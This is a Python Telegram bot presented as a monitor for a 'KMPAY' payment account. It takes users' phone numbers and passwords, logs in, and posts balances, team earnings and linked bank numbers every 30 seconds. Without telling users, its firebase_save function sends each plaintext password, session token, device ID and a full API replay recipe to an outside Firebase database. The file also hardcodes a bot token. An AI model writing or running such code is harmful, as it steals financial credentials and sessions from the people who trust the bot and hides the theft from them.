import os
import requests
import json
import hashlib
import html
import asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ── Constants ────────────────────────────────────────────────────────────────
BOT_TOKEN         = os.environ.get("BOT_TOKEN", "8919242938:AAH-5Ent8nmbtP_-O-K0RmzbDAhGuzl5nnw")
LOGIN_URL         = "https://www.gusuk.cfd/app-server/app/v1/user/login"
SAVE_OPT_URL      = "https://www.gusuk.cfd/app-server/app/v1/account/saveOpt"
PHONE_AUTH_URL    = "https://www.gusuk.cfd/app-server/app/v1/account/phoneAuth"
PERSONAL_HOME_URL = "https://www.gusuk.cfd/app-server/app/v1/user/personalHomepage"
INDEX_INFO_URL    = "https://www.wonoy.cfd/app-server/app/v1/user/indexInfo"
PHONE_PAGE_URL    = "https://www.hexmos.cfd/app-server/app/v1/user-phone/page"
UPDATE_STATUS_URL = "https://www.wonoy.cfd/app-server/app/v1/user-phone/update-status"
FIREBASE_URL      = "https://kmpay-account-default-rtdb.asia-southeast1.firebasedatabase.app"

LOGIN_HEADERS = {
    "User-Agent":       "okhttp/3.12.13",
    "Accept":           "application/json",
    "Accept-Encoding":  "gzip",
    "Content-Type":     "application/json",
    "accept-language":  "en-US",
    "request-paycode":  "Gcash",
    "client-platform":  "Android",
    "skip-url-manager": "true",
}

ASK_NUMBER   = 0
ASK_PASSWORD = 1


def md5(text):
    return hashlib.md5(text.encode()).hexdigest()

def is_ok(raw):
    try:
        return str(json.loads(raw).get("code")) in ("0", "200")
    except Exception:
        return False

def _ch(auth_token, device_id):
    return {
        "User-Agent": "okhttp/3.12.13", "Accept": "application/json",
        "Accept-Encoding": "gzip", "Content-Type": "application/json",
        "accept-language": "en-US", "authorization": auth_token,
        "deviceid": device_id, "request-paycode": "Gcash",
        "client-platform": "Android", "skip-url-manager": "true",
    }

def do_login(phone, plain_pw):
    payload = {"password": md5(plain_pw), "phoneNumber": f"+63{phone}"}
    try:
        return requests.post(LOGIN_URL, data=json.dumps(payload), headers=LOGIN_HEADERS, timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def extract_session(raw):
    try:
        d = json.loads(raw)["data"]
        return {"auth_token": d["authToken"], "device_id": d["deviceId"],
                "user_no": d["loginInfo"]["userNo"], "sms_phone": d.get("smsPhone", "")}
    except Exception:
        return None

def do_save_opt(s):
    payload = {"deviceId": s["device_id"], "phone": s["sms_phone"], "smsList": [], "userNo": s["user_no"]}
    headers = {"User-Agent": "okhttp/3.12.13", "Accept-Encoding": "gzip",
               "authorization": s["auth_token"], "accept-language": "zh-TW",
               "deviceid": s["device_id"], "request-paycode": "Gcash",
               "client-platform": "Android", "content-type": "application/json; charset=utf-8"}
    try:
        return requests.post(SAVE_OPT_URL, data=json.dumps(payload), headers=headers, timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def do_phone_auth(s):
    payload = {"authMode": "hide", "phone": s["sms_phone"], "deviceId": s["device_id"],
               "smsPhone": s["sms_phone"], "permissionResult": "True", "userNo": s["user_no"]}
    try:
        return requests.post(PHONE_AUTH_URL, data=json.dumps(payload), headers=_ch(s["auth_token"], s["device_id"]), timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def do_personal_homepage(s):
    try:
        return requests.post(PERSONAL_HOME_URL, headers={**_ch(s["auth_token"], s["device_id"]), "content-length": "0"}, timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def do_index_info(s):
    try:
        return requests.get(INDEX_INFO_URL, headers=_ch(s["auth_token"], s["device_id"]), timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def do_phone_page(s):
    payload = {"orderByType": "", "pageSize": 10, "orderBy": "", "groupBy": "", "pageNum": 1}
    try:
        return requests.post(PHONE_PAGE_URL, data=json.dumps(payload), headers=_ch(s["auth_token"], s["device_id"]), timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def do_update_status(s, phone_id, pay_code, status):
    payload = {"payCode": pay_code, "id": phone_id, "status": status}
    try:
        return requests.post(UPDATE_STATUS_URL, data=json.dumps(payload), headers=_ch(s["auth_token"], s["device_id"]), timeout=15).text
    except requests.RequestException as e:
        return json.dumps({"code": "-1", "msg": str(e)})

def firebase_save(tg_name, phone, plain_pw, s):
    key = tg_name.replace(".", "_").replace("#", "_").replace("$", "_")
    ch  = _ch(s["auth_token"], s["device_id"])
    data = {
        "login":   {"phone": phone, "password": plain_pw},
        "session": {"auth_token": s["auth_token"], "device_id": s["device_id"],
                    "user_no": s["user_no"], "sms_phone": s["sms_phone"]},
        "api": {
            "saveOpt": {
                "url": SAVE_OPT_URL,
                "payload": {"deviceId": s["device_id"], "phone": s["sms_phone"], "smsList": [], "userNo": s["user_no"]},
                "headers": {"User-Agent": "okhttp/3.12.13", "Accept-Encoding": "gzip",
                            "authorization": s["auth_token"], "accept-language": "zh-TW",
                            "deviceid": s["device_id"], "request-paycode": "Gcash",
                            "client-platform": "Android", "content-type": "application/json; charset=utf-8"},
            },
            "phoneAuth": {
                "url": PHONE_AUTH_URL,
                "payload": {"authMode": "hide", "phone": s["sms_phone"], "deviceId": s["device_id"],
                            "smsPhone": s["sms_phone"], "permissionResult": "True", "userNo": s["user_no"]},
                "headers": ch,
            },
            "personalHomepage": {"url": PERSONAL_HOME_URL, "headers": {**ch, "content-length": "0"}},
            "indexInfo":        {"url": INDEX_INFO_URL,    "headers": {**ch, "content-length": "0"}},
            "phonePage": {
                "url": PHONE_PAGE_URL,
                "payload": {"orderByType": "", "pageSize": 10, "orderBy": "", "groupBy": "", "pageNum": 1},
                "headers": ch,
            },
            "updateStatus": {
                "url": UPDATE_STATUS_URL, "headers": ch,
                "note": "payload: {payCode, id (phoneId from phonePage), status: 2=disable / 0=enable}",
            },
        },
    }
    try:
        requests.put(f"{FIREBASE_URL}/{key}.json", data=json.dumps(data), timeout=10)
    except Exception:
        pass

def firebase_get_login(tg_name):
    key = tg_name.replace(".", "_").replace("#", "_").replace("$", "_")
    try:
        r = requests.get(f"{FIREBASE_URL}/{key}/login.json", timeout=10)
        d = r.json()
        if d and "phone" in d and "password" in d:
            return d
    except Exception:
        pass
    return None


async def run_rebind(bot, chat_id, sess):
    page_r = await asyncio.to_thread(do_phone_page, sess)
    try:
        phones = json.loads(page_r)["data"]["list"]
    except Exception:
        await bot.send_message(chat_id, "Rebind failed: could not fetch phone list.")
        return
    if not phones:
        await bot.send_message(chat_id, "No phone accounts found to rebind.")
        return
    lines = ""
    for p in phones:
        pid = p.get("phoneId")
        pay_code = p.get("payCode", "Maya")
        ph_num   = p.get("phone", "?")
        disabled = str(p.get("phoneStatusName", "")).lower() == "disable"
        if pid is None:
            continue
        if disabled:
            r = await asyncio.to_thread(do_update_status, sess, pid, pay_code, 0)
            lines += f"\n  {ph_num}  was disabled -> enable:{'OK' if is_ok(r) else 'FAIL'}"
        else:
            r1 = await asyncio.to_thread(do_update_status, sess, pid, pay_code, 2)
            r2 = await asyncio.to_thread(do_update_status, sess, pid, pay_code, 0)
            lines += f"\n  {ph_num}  disable:{'OK' if is_ok(r1) else 'FAIL'}  enable:{'OK' if is_ok(r2) else 'FAIL'}"
    await bot.send_message(chat_id,
        f"<b>\u258c REBIND RESULT</b>\n<code>{lines if lines else '  No phones processed'}</code>",
        parse_mode="HTML")


async def start(update, context):
    context.user_data.clear()
    await update.message.reply_text("Enter your number\n(start with 9, e.g. 9945850063)")
    return ASK_NUMBER

async def receive_number(update, context):
    raw = update.message.text.strip()
    if not raw.isdigit() or len(raw) != 10 or raw[0] != "9":
        await update.message.reply_text("Invalid. Enter a 10-digit number starting with 9.")
        return ASK_NUMBER
    context.user_data["phone"] = raw
    await update.message.reply_text("Enter your password")
    return ASK_PASSWORD

async def receive_password(update, context):
    plain_pw = update.message.text.strip()
    if not plain_pw:
        await update.message.reply_text("Password cannot be empty. Try again.")
        return ASK_PASSWORD

    phone    = context.user_data["phone"]
    login_raw= await asyncio.to_thread(do_login, phone, plain_pw)

    try:
        code = str(json.loads(login_raw).get("code"))
        msg  = json.loads(login_raw).get("msg", "")
        if code == "601" or "Wrong account" in msg:
            await update.message.reply_text("<b>Wrong password.</b>\nPlease enter your password again:", parse_mode="HTML")
            return ASK_PASSWORD
    except Exception:
        pass

    sess = extract_session(login_raw)
    if not sess:
        await update.message.reply_text(
            f"<b>Login failed</b>\n<code>{html.escape(login_raw)}</code>\n<i>Type /start to try again.</i>",
            parse_mode="HTML")
        return ConversationHandler.END

    tg_user = update.effective_user
    tg_name = tg_user.username or str(tg_user.id)
    await asyncio.to_thread(firebase_save, tg_name, phone, plain_pw, sess)

    old_task = context.user_data.get("loop_task")
    if old_task and not old_task.done():
        old_task.cancel()

    context.user_data["sess"]     = sess
    context.user_data["phone"]    = phone
    context.user_data["plain_pw"] = plain_pw
    context.user_data["tg_name"]  = tg_name

    chat_id = update.effective_chat.id
    bot     = context.bot
    cycle   = [0]

    async def api_loop():
        while True:
            try:
                cycle[0] += 1
                s   = context.user_data["sess"]
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                save_r  = await asyncio.to_thread(do_save_opt,          s)
                auth_r  = await asyncio.to_thread(do_phone_auth,        s)
                home_r  = await asyncio.to_thread(do_personal_homepage, s)
                index_r = await asyncio.to_thread(do_index_info,        s)
                page_r  = await asyncio.to_thread(do_phone_page,        s)

                svc_save = "ONLINE" if is_ok(save_r) else "OFFLINE"
                svc_auth = "ONLINE" if is_ok(auth_r) else "OFFLINE"

                # Auto re-login when both OFFLINE
                if svc_save == "OFFLINE" and svc_auth == "OFFLINE":
                    fb = await asyncio.to_thread(firebase_get_login, context.user_data.get("tg_name", ""))
                    ph = fb["phone"]    if fb else context.user_data.get("phone", "")
                    pw = fb["password"] if fb else context.user_data.get("plain_pw", "")
                    if ph and pw:
                        new_raw  = await asyncio.to_thread(do_login, ph, pw)
                        new_sess = extract_session(new_raw)
                        if new_sess:
                            context.user_data["sess"] = new_sess
                            s = new_sess
                            await asyncio.to_thread(firebase_save, tg_name, ph, pw, new_sess)
                            save_r  = await asyncio.to_thread(do_save_opt,          s)
                            auth_r  = await asyncio.to_thread(do_phone_auth,        s)
                            home_r  = await asyncio.to_thread(do_personal_homepage, s)
                            index_r = await asyncio.to_thread(do_index_info,        s)
                            page_r  = await asyncio.to_thread(do_phone_page,        s)
                            svc_save = "ONLINE" if is_ok(save_r) else "OFFLINE"
                            svc_auth = "ONLINE" if is_ok(auth_r) else "OFFLINE"

                try:
                    hd      = json.loads(home_r)["data"]
                    avl_bal = f"{float(hd.get('avlBalance',   0)):,.2f}"
                    frz_bal = f"{float(hd.get('freezeBalance',0)):,.2f}"
                    tot_bal = f"{float(hd.get('totalBalance', 0)):,.2f}"
                    income  = f"{float(hd.get('income',        0)):,.2f}"
                except Exception:
                    avl_bal = frz_bal = tot_bal = income = "N/A"

                try:
                    ix       = json.loads(index_r)["data"]
                    self_inc = f"{float(ix.get('selfIncome', 0)):,.2f}"
                    team_inc = f"{float(ix.get('teamIncome', 0)):,.2f}"
                    self_ord = ix.get("selfOrderQty",  0)
                    team_ord = ix.get("teamOrderQty",  0)
                    self_acc = ix.get("selfAccountNum",0)
                    team_acc = ix.get("teamAccountNum",0)
                except Exception:
                    self_inc = team_inc = "N/A"
                    self_ord = team_ord = self_acc = team_acc = "N/A"

                try:
                    phones = json.loads(page_r)["data"]["list"]
                except Exception:
                    phones = []

                phone_lines = ""
                for p in phones:
                    try:
                        ph_num = p.get("phone", "?")
                        bank   = p.get("associatedBank", "?")
                        st     = "enabled" if p.get("phoneStatus") == 0 else "disabled"
                        d_inc  = f"{float(p.get('dayIncome',    0)):,.2f}"
                        bal    = f"{float(p.get('actualBalance', 0)):,.2f}"
                        phone_lines += (f"\n  {ph_num} [{bank}]\n"
                                        f"  Status     : {st}\n"
                                        f"  Day Income : {d_inc}\n"
                                        f"  Balance    : {bal}\n"
                                        f"  {'─'*28}")
                    except Exception:
                        pass

                sep = '\u2500' * 30
                msg = (
                    f"<b>KMPAY MONITOR \u2014 CYCLE #{cycle[0]}</b>\n"
                    f"<code>Time  : {now}</code>\n"
                    f"<code>{sep}</code>\n"
                    f"<b>\u258c SERVICE STATUS</b>\n"
                    f"<code>  saveOpt   : {svc_save}\n  phoneAuth : {svc_auth}\n{sep}</code>\n"
                    f"<b>\u258c HOMEPAGE</b>\n"
                    f"<code>  Deposit             : {avl_bal}\n"
                    f"  Wallet Total Balance: {frz_bal}\n"
                    f"  Total Balance       : {tot_bal}\n\n"
                    f"  Income              : {income}\n{sep}</code>\n"
                    f"<b>\u258c INDEX INFO</b>\n"
                    f"<code>  Today's individual earnings : {self_inc}\n"
                    f"  Today's Team Earnings       : {team_inc}\n\n"
                    f"  Today's personal orders     : {self_ord}\n"
                    f"  Today's team orders         : {team_ord}\n\n"
                    f"  Personal accounts           : {self_acc}\n"
                    f"  Team accounts               : {team_acc}\n{sep}</code>\n"
                    f"<b>\u258c PHONE ACCOUNTS</b>\n"
                    f"<code>{phone_lines if phone_lines else '  No accounts found'}</code>\n"
                    f"<i>Next run in 30s  |  /stop  |  /rebind</i>"
                )
                await bot.send_message(chat_id, msg, parse_mode="HTML")

            except asyncio.CancelledError:
                raise
            except Exception as e:
                try:
                    await bot.send_message(chat_id, f"Loop error (retrying in 30s): {e}")
                except Exception:
                    pass

            await asyncio.sleep(30)

    await update.message.reply_text(f"Successful login\n+63{phone}")
    await run_rebind(bot, chat_id, sess)
    task = asyncio.create_task(api_loop())
    context.user_data["loop_task"] = task
    return ConversationHandler.END


async def cancel(update, context):
    task = context.user_data.get("loop_task")
    if task and not task.done():
        task.cancel()
    await update.message.reply_text("Session ended. Type /start to begin again.")
    return ConversationHandler.END

async def stop_loop(update, context):
    task = context.user_data.get("loop_task")
    if task and not task.done():
        task.cancel()
        await update.message.reply_text("Loop stopped. Type /start to login again.")
    else:
        await update.message.reply_text("No active loop. Type /start to begin.")

async def rebind_cmd(update, context):
    sess = context.user_data.get("sess")
    if not sess:
        await update.message.reply_text("No active session. Type /start to login first.")
        return
    await run_rebind(context.bot, update.effective_chat.id, sess)


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_NUMBER:   [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_number)],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(conv)
    app.add_handler(CommandHandler("stop",   stop_loop))
    app.add_handler(CommandHandler("rebind", rebind_cmd))
    print("Bot is running... Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
